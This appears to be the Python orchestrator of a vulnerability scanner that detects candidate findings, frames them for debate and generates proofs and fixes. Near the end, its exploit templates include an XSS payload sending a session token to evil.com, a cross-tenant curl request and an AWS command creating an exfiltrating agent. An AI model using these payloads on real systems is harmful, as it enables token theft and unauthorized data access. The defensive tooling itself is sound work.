"""
V3 Orchestrator — Generator → Verifier → Prover pipeline.
Coordinates all agents through the three-stage MDASH-inspired architecture.
"""
from __future__ import annotations

import json
import logging
import time
from pathlib import Path
from typing import Any

from v3.harness.state_store import StateStore
from v3.harness.execution import DurableExecutor
from v3.harness.dag import DAGExecutor, DAGNode
from v3.harness.contracts import ALL_CONTRACTS
from v3.agents.base import CandidateFinding, Verdict, Proof
from v3.tools.semgrep_tools import run_semgrep, format_finding
from v3.tools.file_tools import read_file, grep_pattern, list_files
from src.common.graph import CodePropertyGraph
from src.agents.python.cpg_builder import PythonCPGBuilder
from v3.agents.verifiers.grounded_debate import GroundedDebateEngine, CandidateFinding as DebateCandidateFinding

logger = logging.getLogger(__name__)


class V3Orchestrator:
    """
    Three-stage security analysis pipeline.

    Stage 1 (Generator): Multiple specialized scanner agents detect candidates
    Stage 2 (Verifier): Debate agents argue for/against each finding
    Stage 3 (Prover): Exploit + remediation generation for confirmed findings
    """

    def __init__(self, repo_path: str, state_dir: str = None):
        self.repo_path = Path(repo_path)
        self.state_dir = state_dir or str(self.repo_path / ".security-agent" / "v3-state")

        self.state_store = StateStore(self.state_dir)
        self.executor = DurableExecutor(self.state_store)
        self.dag_executor = DAGExecutor(self.executor)

        # Paths to our semgrep rules
        self.rules_dir = Path(__file__).parent.parent / "v2"

        # CPG built in Stage 1, used by Stage 2 debate engine
        self.cpg: CodePropertyGraph | None = None

    def run(self) -> dict:
        """Execute the full three-stage pipeline."""
        start_time = time.time()
        logger.info(f"V3 Pipeline starting: {self.repo_path}")

        # ════════════════════════════════════════════════════════
        # STAGE 1: GENERATOR (Detection — parallel)
        # ════════════════════════════════════════════════════════
        logger.info("═══ STAGE 1: GENERATOR (Detection) ═══")
        candidates = self._stage1_generate()
        logger.info(f"Stage 1 complete: {len(candidates)} candidates")

        # Build CPG for debate grounding (uses same files scanners analyzed)
        self._build_cpg()

        # ════════════════════════════════════════════════════════
        # STAGE 2: VERIFIER (Debate — parallel per finding)
        # ════════════════════════════════════════════════════════
        logger.info("═══ STAGE 2: VERIFIER (Debate) ═══")
        verified = self._stage2_verify(candidates)
        logger.info(f"Stage 2 complete: {len(verified)} verified")

        # ════════════════════════════════════════════════════════
        # STAGE 3: PROVER (Exploit + Fix — sequential)
        # ════════════════════════════════════════════════════════
        logger.info("═══ STAGE 3: PROVER (Exploit + Fix) ═══")
        proven = self._stage3_prove(verified)
        logger.info(f"Stage 3 complete: {len(proven)} proven")

        elapsed = time.time() - start_time

        report = {
            "summary": {
                "candidates_detected": len(candidates),
                "verified_after_debate": len(verified),
                "proven_with_exploits": len(proven),
                "elapsed_seconds": round(elapsed, 1),
            },
            "candidates": [c.to_dict() for c in candidates],
            "verified": [v.__dict__ for v in verified if hasattr(v, "__dict__")],
            "proven": [p.__dict__ for p in proven if hasattr(p, "__dict__")],
        }

        # Save report
        report_path = Path(self.state_dir) / "v3_report.json"
        report_path.write_text(json.dumps(report, indent=2, default=str))
        logger.info(f"Report saved: {report_path}")

        return report

    # ════════════════════════════════════════════════════════════
    # CPG CONSTRUCTION (between Stage 1 and Stage 2)
    # ════════════════════════════════════════════════════════════

    def _build_cpg(self):
        """Build Code Property Graph from target repo's Python files."""
        python_files = []
        for pattern in ("src/**/*.py", "**/*.py"):
            for f in self.repo_path.glob(pattern):
                if "__pycache__" not in str(f) and ".venv" not in str(f):
                    python_files.append(str(f))
            if python_files:
                break

        if not python_files:
            logger.warning("No Python files found for CPG construction")
            return

        logger.info(f"Building CPG from {len(python_files)} Python files")
        builder = PythonCPGBuilder()
        self.cpg = builder.build(python_files, inferred_specs={})
        logger.info(
            f"CPG ready: {self.cpg.node_count()} nodes, {self.cpg.edge_count()} edges, "
            f"{len(self.cpg.sources)} sources, {len(self.cpg.sinks)} sinks, "
            f"{len(self.cpg.find_taint_paths())} taint paths"
        )

        # Persist serialized CPG for resume
        cpg_path = Path(self.state_dir) / "cpg.json"
        cpg_path.parent.mkdir(parents=True, exist_ok=True)
        cpg_path.write_text(json.dumps(self.cpg.serialize(), default=str))

    # ════════════════════════════════════════════════════════════
    # STAGE 1: GENERATOR
    # ════════════════════════════════════════════════════════════

    def _stage1_generate(self) -> list[CandidateFinding]:
        """Run all generator agents in parallel."""
        candidates = []

        # Build DAG of generator tasks (all independent → parallel)
        nodes = [
            DAGNode(
                name="semgrep_python",
                fn=self._run_semgrep_python,
                input_data={"repo_path": str(self.repo_path)},
            ),
            DAGNode(
                name="semgrep_gaps",
                fn=self._run_semgrep_gaps,
                input_data={"repo_path": str(self.repo_path)},
            ),
            DAGNode(
                name="semgrep_frontend",
                fn=self._run_semgrep_frontend,
                input_data={"repo_path": str(self.repo_path)},
            ),
            DAGNode(
                name="infra_checks",
                fn=self._run_infra_checks,
                input_data={"repo_path": str(self.repo_path)},
            ),
            # Business logic agent (independent)
            DAGNode(
                name="business_logic",
                fn=self._run_business_logic,
                input_data={"repo_path": str(self.repo_path)},
            ),
            # Spec inference agent (independent)
            DAGNode(
                name="spec_inference",
                fn=self._run_spec_inference,
                input_data={"repo_path": str(self.repo_path)},
            ),
            # Community rules (independent — Lambda + AI/LLM taint rules)
            DAGNode(
                name="community_rules",
                fn=self._run_community_rules,
                input_data={"repo_path": str(self.repo_path)},
            ),
            # Compound scanner depends on other scanners
            DAGNode(
                name="compound_scanner",
                fn=self._run_compound_scanner,
                input_data={"repo_path": str(self.repo_path)},
                depends_on=["semgrep_python", "semgrep_gaps", "infra_checks"],
            ),
            # Rule generator depends on semgrep (to avoid overlaps)
            DAGNode(
                name="rule_generator",
                fn=self._run_rule_generator,
                input_data={"repo_path": str(self.repo_path)},
                depends_on=["semgrep_python", "semgrep_gaps"],
            ),
        ]

        results = self.dag_executor.execute_dag("stage1", nodes)

        # Collect all candidates from all scanners
        for scanner_name, output in results.items():
            if isinstance(output, dict) and "candidates" in output:
                for c in output["candidates"]:
                    if isinstance(c, dict):
                        candidates.append(CandidateFinding(
                            id=f"{scanner_name}-{len(candidates)}",
                            scanner=scanner_name,
                            title=c.get("title", "Untitled"),
                            severity=c.get("severity", "MEDIUM"),
                            confidence=c.get("confidence", 0.5),
                            evidence=c.get("evidence", ""),
                            file_path=c.get("file_path", ""),
                            line=c.get("line", 0),
                            cwe=c.get("cwe", ""),
                            category=c.get("category", ""),
                        ))

        return candidates

    def _run_semgrep_python(self, input_data: dict) -> dict:
        """Run Python taint rules."""
        rules = str(self.rules_dir / "semgrep_rules.yaml")
        target = str(Path(input_data["repo_path"]) / "src")
        findings = run_semgrep(rules, target)
        return {
            "candidates": [
                {
                    "title": f.get("check_id", "").split(".")[-1],
                    "severity": "CRITICAL" if f.get("extra", {}).get("severity") == "ERROR" else "HIGH",
                    "confidence": 0.8,
                    "evidence": f.get("extra", {}).get("lines", "")[:200],
                    "file_path": f.get("path", ""),
                    "line": f.get("start", {}).get("line", 0),
                    "cwe": f.get("extra", {}).get("metadata", {}).get("cwe", ""),
                    "category": f.get("extra", {}).get("metadata", {}).get("category", ""),
                }
                for f in findings
            ]
        }

    def _run_semgrep_gaps(self, input_data: dict) -> dict:
        """Run gap coverage rules."""
        rules = str(self.rules_dir / "semgrep_rules_gaps.yaml")
        target = str(Path(input_data["repo_path"]) / "src")
        findings = run_semgrep(rules, target)
        return {
            "candidates": [
                {
                    "title": f.get("check_id", "").split(".")[-1],
                    "severity": "HIGH" if f.get("extra", {}).get("severity") == "ERROR" else "MEDIUM",
                    "confidence": 0.7,
                    "evidence": f.get("extra", {}).get("lines", "")[:200],
                    "file_path": f.get("path", ""),
                    "line": f.get("start", {}).get("line", 0),
                    "cwe": f.get("extra", {}).get("metadata", {}).get("cwe", ""),
                    "category": f.get("extra", {}).get("metadata", {}).get("category", ""),
                }
                for f in findings
            ]
        }

    def _run_semgrep_frontend(self, input_data: dict) -> dict:
        """Run frontend JS rules."""
        rules = str(self.rules_dir / "semgrep_rules_frontend.yaml")
        target = str(Path(input_data["repo_path"]) / "frontend")
        if not Path(target).exists():
            return {"candidates": []}
        findings = run_semgrep(rules, target)
        return {
            "candidates": [
                {
                    "title": f.get("check_id", "").split(".")[-1],
                    "severity": "HIGH" if f.get("extra", {}).get("severity") == "ERROR" else "MEDIUM",
                    "confidence": 0.6,
                    "evidence": f.get("extra", {}).get("lines", "")[:200],
                    "file_path": f.get("path", ""),
                    "line": f.get("start", {}).get("line", 0),
                    "cwe": f.get("extra", {}).get("metadata", {}).get("cwe", ""),
                    "category": f.get("extra", {}).get("metadata", {}).get("category", ""),
                }
                for f in findings
            ]
        }

    def _run_infra_checks(self, input_data: dict) -> dict:
        """Run infrastructure deterministic checks."""
        import sys
        sys.path.insert(0, str(Path(__file__).parent.parent))
        from src.agents.infrastructure.cfn_parser import CloudFormationParser
        from src.agents.infrastructure.deterministic_checks import DeterministicChecker

        repo = Path(input_data["repo_path"])
        all_resources = {}
        all_content = ""

        for stack_file in (repo / "infra" / "stacks").glob("*.py"):
            content = stack_file.read_text()
            all_content += content
            lines = content.split("\n")
            for i, line in enumerate(lines):
                if "lambda_.Function(" in line or "lambda_.DockerImageFunction(" in line:
                    all_resources[f"Lambda_{len(all_resources)}"] = {"Type": "AWS::Lambda::Function", "Properties": {"SourceLine": i+1}}
                elif "dynamodb.Table(" in line:
                    all_resources[f"DynamoDB_{len(all_resources)}"] = {"Type": "AWS::DynamoDB::Table", "Properties": {"SourceLine": i+1}}
                elif "s3.Bucket(" in line:
                    all_resources[f"S3_{len(all_resources)}"] = {"Type": "AWS::S3::Bucket", "Properties": {"SourceLine": i+1}}

        template = {"Resources": all_resources, "RawContent": all_content}
        parser = CloudFormationParser()
        graph = parser.parse(template)
        checker = DeterministicChecker()
        findings = checker.check(graph)

        return {
            "candidates": [
                {
                    "title": f.title,
                    "severity": f.severity.name,
                    "confidence": 1.0,
                    "evidence": f.evidence.snippet,
                    "file_path": "infra/stacks/",
                    "line": 0,
                    "cwe": f.cwe or "",
                    "category": f.category,
                }
                for f in findings
            ]
        }

    def _run_compound_scanner(self, input_data: dict) -> dict:
        """Run compound risk detection using outputs from other scanners."""
        from v2.correlator import correlate

        # Check if prior results exist
        results_dir = Path(self.state_dir)
        semgrep_path = results_dir / "semgrep_for_compound.json"
        infra_path = results_dir / "infra_for_compound.json"

        # Get findings from prior steps
        py_output = input_data.get("from_semgrep_python", {})
        gap_output = input_data.get("from_semgrep_gaps", {})
        infra_output = input_data.get("from_infra_checks", {})

        # Write temp files for correlator
        all_semgrep = py_output.get("candidates", []) + gap_output.get("candidates", [])
        semgrep_path.write_text(json.dumps(all_semgrep, indent=2))
        infra_path.write_text(json.dumps(infra_output.get("candidates", []), indent=2))

        try:
            compounds = correlate(str(semgrep_path), str(infra_path))
            return {
                "candidates": [
                    {
                        "title": c.title,
                        "severity": c.severity,
                        "confidence": 0.9,
                        "evidence": c.attack_narrative[:200],
                        "file_path": "cross-boundary",
                        "line": 0,
                        "category": "compound_risk",
                    }
                    for c in compounds
                ]
            }
        except Exception as e:
            logger.warning(f"Compound scanner failed: {e}")
            return {"candidates": []}

    def _run_business_logic(self, input_data: dict) -> dict:
        """Run business logic agent to detect IDOR and missing auth."""
        try:
            from v3.agents.generators.business_logic_agent import BusinessLogicAgent
            repo = Path(input_data["repo_path"])
            agent = BusinessLogicAgent(str(repo))
            files = [str(f) for f in repo.glob("src/**/*.py") if "__pycache__" not in str(f)]

            # Run both detection passes
            idor_findings = agent.detect_idor(files)
            auth_findings = agent.detect_missing_auth_transitions(files)
            all_findings = idor_findings + auth_findings

            return {
                "candidates": [
                    {
                        "title": f.title,
                        "severity": f.severity,
                        "confidence": f.confidence,
                        "evidence": f.evidence[:200],
                        "file_path": f.file_path,
                        "line": f.line,
                        "cwe": f.cwe or "CWE-639",
                        "category": f.category or "business_logic",
                    }
                    for f in all_findings
                ]
            }
        except Exception as e:
            logger.warning(f"Business logic agent failed: {e}")
            return {"candidates": []}

    def _run_spec_inference(self, input_data: dict) -> dict:
        """Run spec inference to discover novel taint paths."""
        try:
            from v3.agents.generators.spec_inference_agent import SpecInferenceAgent
            agent = SpecInferenceAgent()
            repo = Path(input_data["repo_path"])
            files = [str(f) for f in repo.glob("src/**/*.py") if "__pycache__" not in str(f)]
            result = agent.run(files)
            return {
                "candidates": [
                    {
                        "title": f["title"],
                        "severity": f["severity"],
                        "confidence": f["confidence"],
                        "evidence": f"Source: {f['source']['text'][:80]} → Sink: {f['sink']['text'][:80]}",
                        "file_path": f["source"]["file"],
                        "line": f["source"]["line"],
                        "cwe": "CWE-20",
                        "category": "inferred_taint_path",
                    }
                    for f in result.new_findings
                ]
            }
        except Exception as e:
            logger.warning(f"Spec inference agent failed: {e}")
            return {"candidates": []}

    def _run_community_rules(self, input_data: dict) -> dict:
        """Run community Semgrep rules (Lambda + AI/LLM taint detection)."""
        try:
            community_dir = Path(__file__).parent / "knowledge" / "community_rules"
            repo = Path(input_data["repo_path"])

            all_findings = []

            # Run Lambda rules against Python source
            lambda_rules = community_dir / "aws-lambda" / "security"
            if lambda_rules.exists():
                src_dir = repo / "src"
                if src_dir.exists():
                    findings = run_semgrep(str(lambda_rules), str(src_dir))
                    all_findings.extend(findings)

            # Run Python lang security rules against source
            lang_rules = community_dir / "python_lang_security"
            if lang_rules.exists():
                src_dir = repo / "src"
                if src_dir.exists():
                    findings = run_semgrep(str(lang_rules), str(src_dir))
                    all_findings.extend(findings)

            return {
                "candidates": [
                    {
                        "title": f"community:{f.get('check_id', '').split('.')[-1]}",
                        "severity": "HIGH" if f.get("extra", {}).get("severity") == "ERROR" else "MEDIUM",
                        "confidence": 0.8,
                        "evidence": f.get("extra", {}).get("lines", "")[:200],
                        "file_path": f.get("path", ""),
                        "line": f.get("start", {}).get("line", 0),
                        "cwe": str(f.get("extra", {}).get("metadata", {}).get("cwe", "")),
                        "category": f"community_{f.get('extra', {}).get('metadata', {}).get('category', '')}",
                    }
                    for f in all_findings
                ]
            }
        except Exception as e:
            logger.warning(f"Community rules scanner failed: {e}")
            return {"candidates": []}

    def _run_rule_generator(self, input_data: dict) -> dict:
        """Generate and run custom Semgrep rules for uncovered patterns."""
        try:
            from v3.agents.generators.rule_generator import SemgrepRuleGenerator
            gen = SemgrepRuleGenerator(existing_rules_dir=str(self.rules_dir))
            repo = Path(input_data["repo_path"])
            # Limit to handler files for performance (these have the most source→sink patterns)
            files = [str(f) for f in repo.glob("src/**/handler*.py") if "__pycache__" not in str(f)]
            files += [str(f) for f in repo.glob("src/**/*management*.py") if "__pycache__" not in str(f)]
            files = list(set(files))[:15]

            rules = gen.generate_rules(files)
            # Save generated rules for future runs
            if rules:
                output_path = Path(self.state_dir) / "generated_rules.yaml"
                output_path.parent.mkdir(parents=True, exist_ok=True)
                gen.save_rules(rules, str(output_path))

            # Convert rules with findings into candidates
            candidates = []
            for rule in rules:
                if rule.findings_count > 0:
                    candidates.append({
                        "title": f"Generated: {rule.id}",
                        "severity": "MEDIUM",
                        "confidence": 0.6,
                        "evidence": rule.message[:200],
                        "file_path": "",
                        "line": 0,
                        "cwe": rule.cwe,
                        "category": f"generated_rule_{rule.category}",
                    })
            return {"candidates": candidates}
        except Exception as e:
            logger.warning(f"Rule generator failed: {e}")
            return {"candidates": []}

    # ════════════════════════════════════════════════════════════
    # STAGE 2: VERIFIER (Debate)
    # ════════════════════════════════════════════════════════════

    def _stage2_verify(self, candidates: list[CandidateFinding]) -> list[CandidateFinding]:
        """
        For each candidate, run grounded debate with CPG slice evidence.
        Only CRITICAL/HIGH findings are debated; lower severity passes through.
        Deduplicates findings by (title, file_path) to avoid redundant debates.
        """
        to_debate_all = [c for c in candidates if c.severity in ("CRITICAL", "HIGH")]
        pass_through = [c for c in candidates if c.severity not in ("CRITICAL", "HIGH")]

        # Deduplicate: keep one finding per unique title for debate
        # (avoids debating 91 identical dom-xss findings separately)
        seen = set()
        to_debate = []
        duplicates = []
        for c in to_debate_all:
            key = c.title
            if key not in seen:
                seen.add(key)
                to_debate.append(c)
            else:
                duplicates.append(c)

        if duplicates:
            logger.info(f"Deduplicated {len(duplicates)} redundant findings from debate")

        logger.info(f"Debating {len(to_debate)} findings (passing through {len(pass_through)} lower severity)")

        verified = list(pass_through)

        # Initialize grounded debate engine with CPG
        debate_engine = GroundedDebateEngine(cpg=self.cpg)

        # Generate grounded debate prompts with CPG slice evidence
        prompts_path = Path(self.state_dir) / "debate_prompts.md"
        prompts_path.parent.mkdir(parents=True, exist_ok=True)

        with open(prompts_path, "w") as f:
            f.write("# Stage 2: Grounded Debate (CPG-Anchored)\n\n")

            for i, candidate in enumerate(to_debate):
                # Convert to debate candidate format
                debate_candidate = DebateCandidateFinding(
                    id=candidate.id,
                    title=candidate.title,
                    severity=candidate.severity,
                    category=candidate.category,
                    file_path=candidate.file_path,
                    line=candidate.line,
                    evidence_text=candidate.evidence,
                    cwe=candidate.cwe,
                )

                # Build evidence bundle with CPG slices
                bundle = debate_engine.build_evidence_bundle(debate_candidate)
                prompts = debate_engine.generate_debate_prompts(debate_candidate, bundle)

                f.write(f"\n## Debate {i+1}: {candidate.title}\n")
                f.write(f"**File:** {candidate.file_path}:{candidate.line}\n")
                f.write(f"**Severity:** {candidate.severity}\n")
                f.write(f"**Evidence items:** {len(bundle.items)}\n")
                path_nodes = [item for item in bundle.items if item.category == "path_node"]
                f.write(f"**Taint path steps:** {len(path_nodes)}\n\n")

                f.write("### Evidence Bundle\n")
                f.write(prompts["evidence_bundle"])
                f.write("\n\n### Prosecution Prompt\n")
                f.write(prompts["prosecution_prompt"])
                f.write("\n\n### Defense Prompt\n")
                f.write(prompts["defense_prompt"])
                f.write("\n\n---\n")

                logger.info(
                    f"Debate {i+1}/{len(to_debate)}: {candidate.title} — "
                    f"{len(bundle.items)} evidence items, {len(path_nodes)} path steps"
                )

        logger.info(f"Grounded debate prompts written to {prompts_path}")

        # All debated findings pass through (Claude processes debates asynchronously)
        verified.extend(to_debate)
        verified.extend(duplicates)  # Duplicates inherit parent's debate verdict

        return verified

    # ════════════════════════════════════════════════════════════
    # STAGE 3: PROVER (Exploit + Fix)
    # ════════════════════════════════════════════════════════════

    def _stage3_prove(self, verified: list[CandidateFinding]) -> list[dict]:
        """Generate exploits, EXECUTE validation, verify fixes."""
        from v3.tools.sandbox_tools import ExploitSandbox
        from v3.agents.provers.fix_verifier import FixVerifier

        sandbox = ExploitSandbox(str(self.repo_path))
        fix_verifier = FixVerifier(rules_dir=str(self.rules_dir))
        proven = []

        # Only prove CRITICAL and HIGH findings
        to_prove = [f for f in verified if f.severity in ("CRITICAL", "HIGH")]

        # Deduplicate: only prove one representative per (title, category)
        # then apply result to all duplicates
        seen_proofs: dict[str, dict] = {}  # key → proof result
        unique_to_prove = []
        duplicates_map: dict[str, list[CandidateFinding]] = {}

        for f in to_prove:
            key = (f.title, f.category)
            if key not in duplicates_map:
                duplicates_map[key] = []
                unique_to_prove.append(f)
            else:
                duplicates_map[key].append(f)

        logger.info(
            f"Stage 3: proving {len(unique_to_prove)} unique findings "
            f"({len(to_prove) - len(unique_to_prove)} duplicates will inherit)"
        )

        for finding in unique_to_prove:
            proof = self._generate_proof(finding)

            # EXECUTION CHECK: validate the exploit actually works
            exploit_result = sandbox.validate_exploit(
                finding=finding.to_dict(),
                exploit_code=proof.get("exploit", ""),
            )

            proof["validation"] = {
                "status": exploit_result.status,
                "method": exploit_result.method,
                "evidence": exploit_result.evidence,
                "output": exploit_result.output,
                "duration_ms": exploit_result.duration_ms,
            }

            if exploit_result.status == "PROVEN":
                proof["proven"] = True
                logger.info(f"PROVEN: {finding.title} ({exploit_result.method})")
            else:
                proof["proven"] = False
                logger.info(f"NOT PROVEN: {finding.title} ({exploit_result.status})")

            # FIX VERIFICATION: only attempt for findings with a real source file
            if finding.file_path and Path(finding.file_path).is_file():
                fix_result = self._verify_fix(finding, fix_verifier)
                proof["fix_verification"] = {
                    "status": fix_result.status,
                    "findings_before": fix_result.findings_before,
                    "findings_after": fix_result.findings_after,
                    "attempts": fix_result.attempts,
                    "message": fix_result.message,
                }
                if fix_result.fix:
                    proof["fix"] = fix_result.fix.as_diff()
                    proof["fix_description"] = fix_result.fix.description
                if fix_result.status == "VERIFIED":
                    logger.info(f"FIX VERIFIED: {finding.title}")
            else:
                proof["fix_verification"] = {
                    "status": "SKIPPED",
                    "findings_before": 0, "findings_after": 0,
                    "attempts": 0,
                    "message": "No source file for fix verification",
                }

            proven.append(proof)

            # Apply same proof to duplicates
            key = (finding.title, finding.category)
            for dup in duplicates_map.get(key, []):
                dup_proof = {
                    "finding_id": dup.id,
                    "title": dup.title,
                    "severity": dup.severity,
                    "proven": proof.get("proven", False),
                    "validation": proof["validation"],
                    "fix_verification": {"status": "INHERITED", "message": "Same as representative"},
                    "duplicate_of": finding.id,
                }
                proven.append(dup_proof)

        # Save proofs with validation results
        proofs_path = Path(self.state_dir) / "proofs.json"
        proofs_path.write_text(json.dumps(proven, indent=2, default=str))

        proven_count = sum(1 for p in proven if p.get("proven"))
        fix_verified = sum(1 for p in proven if p.get("fix_verification", {}).get("status") == "VERIFIED")
        logger.info(
            f"Proofs: {proven_count}/{len(proven)} PROVEN, "
            f"{fix_verified}/{len(proven)} fixes VERIFIED"
        )

        return proven

    def _verify_fix(self, finding: CandidateFinding, fix_verifier) -> "FixVerificationResult":
        """Run fix verification for a finding."""
        from v3.agents.provers.fix_verifier import FixVerificationResult

        # Resolve the source file path
        file_path = finding.file_path
        resolved = Path(file_path) if file_path else None

        if not resolved or not resolved.is_file():
            # Try resolving relative to repo
            resolved = self.repo_path / file_path if file_path else None
            if not resolved or not resolved.is_file():
                return FixVerificationResult(
                    status="ERROR", fix=None, findings_before=0,
                    findings_after=0, attempts=0,
                    message=f"Source file not found or not a file: {file_path}"
                )

        source_code = resolved.read_text(encoding="utf-8")

        return fix_verifier.verify_fix(
            finding=finding.to_dict() if hasattr(finding, "to_dict") else {
                "id": finding.id, "title": finding.title,
                "category": finding.category, "file_path": str(resolved),
                "line": finding.line,
            },
            source_code=source_code,
        )

    def _generate_proof(self, finding: CandidateFinding) -> dict:
        """Generate exploit PoC + remediation for a finding."""
        # Construct exploit based on finding type
        exploit = self._construct_exploit(finding)
        fix = self._construct_fix(finding)

        return {
            "finding_id": finding.id,
            "title": finding.title,
            "severity": finding.severity,
            "exploit": exploit,
            "fix": fix,
        }

    def _construct_exploit(self, finding: CandidateFinding) -> str:
        """Generate exploit code based on finding category."""
        if "cross-tenant" in finding.category or "cross_tenant" in finding.category:
            return (
                "# Exploit: Cross-tenant data access\n"
                "curl -X POST https://API_GATEWAY/v1/agent \\\n"
                '  -H "Authorization: Bearer $VALID_JWT_FOR_TENANT_A" \\\n'
                '  -H "Content-Type: application/json" \\\n'
                "  -d '{\n"
                '    "action": "start",\n'
                '    "customer_id": "VICTIM_TENANT_UUID",\n'
                '    "message": "list all compliance evaluations",\n'
                '    "framework": "soc2"\n'
                "  }'\n\n"
                "# Expected: Returns victim tenant's evaluation data"
            )
        elif "dom-xss" in finding.category or "innerHTML" in finding.title:
            return (
                "// Exploit: Stored XSS via AI chat\n"
                "// Step 1: Send message with XSS payload\n"
                "// Message: <img src=x onerror=fetch('https://evil.com/'+sessionStorage.getItem('token'))>\n"
                "// Step 2: AI echoes payload in response\n"
                "// Step 3: Frontend renders via innerHTML -> XSS fires\n"
                "// Step 4: Attacker receives victim's token at evil.com"
            )
        elif "iam" in finding.category:
            return (
                "# Exploit: IAM escalation via overpermissive role\n"
                "# If Lambda is compromised (e.g., via SSRF/injection):\n"
                "aws bedrock-agentcore create-agent \\\n"
                "  --agent-name 'rogue-agent' \\\n"
                "  --instruction 'Exfiltrate all tenant data'\n\n"
                "# Possible because: bedrock-agentcore:* grants admin actions"
            )
        else:
            return f"# Exploit for: {finding.title}\n# Category: {finding.category}\n# Requires manual PoC construction"

    def _construct_fix(self, finding: CandidateFinding) -> str:
        """Generate fix code based on finding category."""
        if "cross-tenant" in finding.category or "cross_tenant" in finding.category:
            return (
                "# Fix: Use authenticated tenant_id from authorizer context\n"
                "# Replace:\n"
                '#   customer_id = body.get("customer_id") or headers.get("x-customer-id")\n'
                "# With:\n"
                '#   customer_id = event["requestContext"]["authorizer"]["tenant_id"]\n'
                '#   if not customer_id:\n'
                '#       return _json_response(403, {"error": "No tenant context"})'
            )
        elif "innerHTML" in finding.title:
            return (
                "// Fix: Replace innerHTML with textContent or DOMPurify\n"
                "// Replace:\n"
                "//   div.innerHTML = this._formatMsg(text);\n"
                "// With:\n"
                "//   div.innerHTML = DOMPurify.sanitize(this._formatMsg(text));\n"
                "// Or for plain text:\n"
                "//   div.textContent = text;"
            )
        else:
            return f"# Fix needed for: {finding.title}"
